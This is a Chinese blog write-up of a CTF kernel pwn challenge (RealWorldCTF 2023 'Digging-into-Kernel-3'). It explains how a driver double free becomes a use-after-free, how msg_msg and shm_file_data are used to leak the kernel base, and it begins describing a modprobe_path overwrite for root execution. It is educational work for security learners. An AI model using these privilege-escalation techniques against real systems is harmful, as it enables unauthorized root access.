<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>内核堆利用相关 | Photon’s Blog</title><meta name="keywords" content="kernel,pwn"><meta name="author" content="Photon"><meta name="copyright" content="Photon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解 slub分配类似ptmalloc2，内核的堆也有一套管理机制，主要有三种:slub、slab、slob。在平时做kernel题时我们主要接触的是slub分配。关于slub分配的原理可以参考这篇博客 ,我认为描述的十分清晰易懂">
<meta property="og:type" content="article">
<meta property="og:title" content="内核堆利用相关">
<meta property="og:url" content="http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/index.html">
<meta property="og:site_name" content="Photon’s Blog">
<meta property="og:description" content="最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解 slub分配类似ptmalloc2，内核的堆也有一套管理机制，主要有三种:slub、slab、slob。在平时做kernel题时我们主要接触的是slub分配。关于slub分配的原理可以参考这篇博客 ,我认为描述的十分清晰易懂">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg">
<meta property="article:published_time" content="2023-01-19T11:31:29.000Z">
<meta property="article:modified_time" content="2023-02-07T06:32:53.890Z">
<meta property="article:author" content="Photon">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg"><link rel="shortcut icon" href="/img/20170202211516_4B3nj.thumb.1000_0.jpeg"><link rel="canonical" href="http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内核堆利用相关',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-07 14:32:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Photon’s Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/01/19/K4TwFgDxsJ62tEo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">32</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Photon’s Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内核堆利用相关</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-01-19T11:31:29.000Z" title="Created 2023-01-19 19:31:29">2023-01-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-07T06:32:53.890Z" title="Updated 2023-02-07 14:32:53">2023-02-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>31min</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解</p>
<h1 id="slub分配"><a href="#slub分配" class="headerlink" title="slub分配"></a>slub分配</h1><p>类似ptmalloc2，内核的堆也有一套管理机制，主要有三种:slub、slab、slob。在平时做kernel题时我们主要接触的是slub分配。关于slub分配的原理可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/lukuen/article/details/6935068">这篇博客</a> ,我认为描述的十分清晰易懂。同时google上应该能搜到不少相关的介绍</p>
<p>简要地了解之后我们便可以深入题目来理解了，毕竟实战调试才是加深理解的重要手段</p>
<h1 id="REALWORDCTF-2023-体验赛-Digging-into-Kernel-3"><a href="#REALWORDCTF-2023-体验赛-Digging-into-Kernel-3" class="headerlink" title="[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3"></a>[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3</h1><h2 id="Pre-提取vmlinux获取符号"><a href="#Pre-提取vmlinux获取符号" class="headerlink" title="Pre.提取vmlinux获取符号"></a>Pre.提取vmlinux获取符号</h2><p>这个<a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf">工具</a> 能够是我们获取带有符号信息的文件，方便打断点调试之类的</p>
<h2 id="Pre-调试准备"><a href="#Pre-调试准备" class="headerlink" title="Pre.调试准备"></a>Pre.调试准备</h2><p>可以修改run.sh以及init文件以便于调试，比如改nokaslr,或者修改为直接root进系统方便查看驱动加载基地址或者.text段地址，方便载入符号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/rwctf/sections/.text</span><br></pre></td></tr></table></figure>
<p>然后在gdb里面载入符号命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file &lt;file&gt; &lt;address&gt; -s &lt;section_name&gt; &lt;section_base&gt;</span><br></pre></td></tr></table></figure>
<p>不过有个疑问，如果我想对写的exp进行调试该如何加载符号信息?</p>
<p>我的一个初步的想法是关闭地址偏移，让exp文件的.text基址固定然后<code>add-symbol-file</code>载入exp</p>
<p>不过由于gdb调试的时候好像自动关闭了ASLR，所以不用手动关闭了。我们只需要通过IDA找出exp的.text基址，然后载入即可</p>
<p><img src="https://s2.loli.net/2023/01/21/VyJT4sIxB9eQr7i.png" alt=""></p>
<p>尝试了一下这样雀食是可以在exp上面下断点进行调试的，不过感觉不够优雅（</p>
<p><img src="https://s2.loli.net/2023/01/21/jh9ziSInlbBqKEM.png" alt=""></p>
<h2 id="Analysis-简略分析"><a href="#Analysis-简略分析" class="headerlink" title="Analysis.简略分析"></a>Analysis.简略分析</h2><p>把ko文件拖入IDA分析一下，其逻辑非常简单，我们传入的参数是由序号，大小，还有指向需要传入数据的指针构成的，主要问题在于kfree的时候没有将数组对应项置零，从而导致了Double Free。</p>
<p><img src="https://s2.loli.net/2023/01/21/y1nFNSTMDUtGv5e.png" alt=""></p>
<p>这个Double Free可以转换成UAF进行利用。比如我们首先通过这个驱动申请一个object，然后free掉，放入freelist，然后再通过一些系统调用之类的在内核空间申请一个(或者堆喷)一些用到这个size的object的结构体，此时这个系统调用控制了这个object，然后我们再通过驱动再次free掉这个object，那么虽然这个系统调用控制了整个object，但是实际上它已经被free掉了，构成了UAF。所以也就是说我们拥有一个任意size的UAF使用。</p>
<p>朴素来说kernel提权的思路分为两类，一种是通过一些特殊的结构体的一些操作(比如修改tty的函数表)劫持控制流，一种是直接改进程的cred结构体。二者都离不开内核基址的泄露，所以考虑进一步操作之前我们先思考如何泄露基址</p>
<h2 id="Analysis-内核基址泄露"><a href="#Analysis-内核基址泄露" class="headerlink" title="Analysis.内核基址泄露"></a>Analysis.内核基址泄露</h2><p>题目提供的驱动本身没有提供含有类似<code>copy_to_user</code>这种向用户态返回数据的函数的功能，所以我们需要用一种通用的办法来泄露基址。一个比较通用的办法是利用<code>msg_msg</code>这个结构体，构成”读的原语”</p>
<p>这个东西是用来实现进程间通信(IPC)的一个东西。用户可以通过如下函数实现相应的功能</p>
<ul>
<li>msgget: 创建消息队列</li>
<li>msgsnd:向指定消息队列发送消息</li>
<li>msgrcv: 从指定消息队列接收消息</li>
</ul>
<p>比如以下是一个简单的创造队列-发送消息-读取消息的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msggbuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x50</span>];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125; msg;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    msg.mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg.mtext,<span class="string">&#x27;A&#x27;</span>,<span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] QID = %d&quot;</span>,qid);</span><br><span class="line">    msgsnd(qid,&amp;msg,<span class="keyword">sizeof</span>(msg.mtext),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * memdump = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] MEM_ADDR = %p&quot;</span>,memdump);</span><br><span class="line">    msgrcv(qid,memdump,<span class="number">0x50</span>,<span class="number">0</span>,IPC_NOWAIT |MSG_NOERROR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,(<span class="keyword">char</span> *)memdump);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是发送消息时我们必须用<code>struct msggbuf</code>这样的一个结构体来指定<code>type</code>，然后才是我们传送的内容，然后<code>msgsnd</code>和<code>msgrcv</code>的时候指定的<code>size</code>是不包括这个长整型的长度的(本例中也就是不是0x58而是0x50)，但放入memdump的时候似乎其实会有这个type的</p>
<p><img src="https://s2.loli.net/2023/01/21/6lC2QTaim7GpOkM.png" alt=""></p>
<p>介绍完使用之后我们再研究内核对这些消息的处理。</p>
<p>当通过<code>msgget</code>创建一个消息队列时，内核中会创建这样一个结构体用来表示消息队列</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<p>当通过<code>msgsnd</code>在某个消息队列发送一个消息时，内核中会创造这样一个结构体来表示一个消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">	<span class="keyword">long</span> m_type;</span><br><span class="line">	<span class="keyword">size_t</span> m_ts;		<span class="comment">/* message text size */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *security;</span><br><span class="line">	<span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中<code>struct list_head</code>是内核用来提供表示双向循环链表的一个结构，其定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>调用<code>msgsnd</code>时内核最终会调用<code>alloc_msg()</code>函数来分配空间，形成<code>msg_msg</code>结构体以及相应的消息内容，其规则是这样的</p>
<ul>
<li>如果消息内容的大小<strong>小于一个页面的大小减去作为header的msg_msg之后的大小(也就是小于0x1000-0x30=0xfd0)</strong>，内核会分配一个size+header_size大小的object，前面0x30(对应msg_msg结构体的大小)存放msg_msg结构体，后面存放消息内容</li>
<li>如果消息内容大小<strong>大于页面大小减去msg_msg大小(0xfd0)</strong> 那么内核将以单链表的形式将消息内容分片然后组织起来。具体来说，msg_msg结构体里面的<code>struct msg_msgseg *next;</code>将会起作用。被组织起来的第一个消息称为消息头，剩余的称为segment，图解如下</li>
</ul>
<p><img src="https://s2.loli.net/2023/01/21/yZufIjwMREvSBrd.png" alt=""></p>
<p>容易想到的是，如果我们篡改msg_msg的m_ts,把它改大，那么将会实现越界读取，进一步的如果我们能同时篡改<code>m_ts</code>以及<code>struct msg_msgseg *next;</code>，那么我们将可以实现任意地址读。但是有个问题，为了防止访问错误,<code>struct msg_msgseg *next;</code>指向的<code>segment</code>的前8个字节(也就是对应的segment的<code>struct msg_msgseg *next;</code>最好为NULL)(感觉似乎其他合理地址也行？但是必须保证这个链起来的单链表以NULL结尾)。</p>
<p>对于本题来说，我们希望有一个包含内核地址的结构体，并且其前8个字节为NULL，这样我们就可以通过UAF进行泄露。而恰好有这样一个结构体满足要求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*输出大致如下</span></span><br><span class="line"><span class="comment">0x0000：0x0000000000000000</span></span><br><span class="line"><span class="comment">0x0008：0xffffffff82292ae0</span></span><br><span class="line"><span class="comment">0x0010：0xffff88800ea09700</span></span><br><span class="line"><span class="comment">0x0018：0xffffffff81e15540</span></span><br><span class="line"><span class="comment">[+] kbase = 0xffffffff81000000</span></span><br><span class="line"><span class="comment">[+] kheap = 0xffff88800ea09700</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>其大小为0x20,前8字节为NULL，并且vm_ops指向内核数据区，可以进行泄露。</p>
<p>申请的方法如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shmid;</span><br><span class="line">	<span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面思考的是如何利用UAF进行泄露它。容易想到的是如果我们先通过驱动获取一个shm_file_data大小的object，然后再释放它，让他放入free list。之后我们再申请合适大小的msg_msg，那么会有一个msg_msg的segment命中刚刚那个释放的free list（因为消息头大于已经大于0x20了，所以不能让消息头命中，只能通过segment命中,而且让消息头命中会破坏msg_msg结构体的list_head双链表，）。然后通过驱动把那块object再次free，然后再申请shm_file_data，那么刚刚被free的object有可能命中从而被写上shm_file_data的数据。由从而msg_msg的segment已经被改写成了shm_file_data的数据，我们直接recv掉就可以获取</p>
<p>那么实际上我们申请的message的总大小应该是0xfd0+(0x20-8) = 0xfe8</p>
<p>需要注意的一点是，<strong>利用<code>shm_file_data</code>结构体泄露完内存基址的时候，我们最好及时的将其释放</strong>。我观察到似乎进行系统调用时系统会自动将其释放，解引用了<code>struct ipc_namespace *ns</code>指针。如果后续申请到了这个object然后对其进行破坏了的话会造成缺页故障然后panic，我观察到的问题出在<code>shm_close+26</code>对某个非法的地址进行了读取操作,调试可知道其中<code>rbx</code>寄存器指向的是<code>struct ipc_namespace *ns</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff813cadd0 &lt;shm_close&gt;:      push   r14</span><br><span class="line">0xffffffff813cadd2 &lt;shm_close+2&gt;:    push   r13</span><br><span class="line">0xffffffff813cadd4 &lt;shm_close+4&gt;:    push   r12</span><br><span class="line">0xffffffff813cadd6 &lt;shm_close+6&gt;:    push   rbp</span><br><span class="line">0xffffffff813cadd7 &lt;shm_close+7&gt;:    push   rbx</span><br><span class="line">0xffffffff813cadd8 &lt;shm_close+8&gt;:    mov    rax,QWORD PTR [rdi+0xa0]</span><br><span class="line">0xffffffff813caddf &lt;shm_close+15&gt;:   mov    rbp,QWORD PTR [rax+0xc8]</span><br><span class="line">0xffffffff813cade6 &lt;shm_close+22&gt;:   mov    rbx,QWORD PTR [rbp+0x8]</span><br><span class="line">0xffffffff813cadea &lt;shm_close+26&gt;:   lea    r12,[rbx+0x1b8]</span><br></pre></td></tr></table></figure>
<p>释放的方法如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) </span><br><span class="line">    Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-解法一-任意地址写modprode-path"><a href="#Analysis-解法一-任意地址写modprode-path" class="headerlink" title="Analysis.解法一:任意地址写modprode_path"></a>Analysis.解法一:任意地址写modprode_path</h2><p>当内核没有开启slab_freelist_hardened(这是一种类似用户态下对bin中链向其他chunk进行异或加密的操作)的时候,我们可以利用double free进行任意地址写(类似tcachebin poisioning那样)，那么写哪里比较好呢？</p>
<p>这里介绍一个东西，叫做<code>modprode_path</code> 。当我们在内核当中安装或者卸载新模块的时候就会执行这个程序。而这个程序的路径保存在内核当中，是一个全局变量，默认为<code>/sbin/modprobe</code>,可以通过命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/modprobe</span><br></pre></td></tr></table></figure>
<p>来查看。当内核运行一个错误格式的文件(或者未知文件类型的文件)的时候也会调用这个程序，并且运行这个程序的时候是具有root权限的。</p>
<p>内核当中保存了这个程序的路径，而且是可以更改的。那么我们就可以更改这个路径为我们自己写的bash文件，使得运行错误文件的时候就会运行这个bash文件，进而输出flag。</p>
<p>如果有符号的话我们可以直接通过gdb来输出这个地址来确定偏移。</p>
<p><img src="https://s2.loli.net/2023/01/21/kM7D95bjavR4Tqt.png" alt=""> </p>
